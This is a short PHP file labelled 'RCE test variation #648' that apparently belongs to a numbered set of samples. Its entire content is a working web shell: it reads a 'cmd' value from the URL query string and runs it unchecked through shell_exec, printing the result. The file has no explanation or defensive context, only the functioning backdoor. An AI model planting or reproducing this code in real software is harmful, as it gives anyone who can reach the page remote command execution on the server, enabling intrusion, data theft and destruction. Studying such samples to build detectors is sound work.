<?php
// RCE test variation #648
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>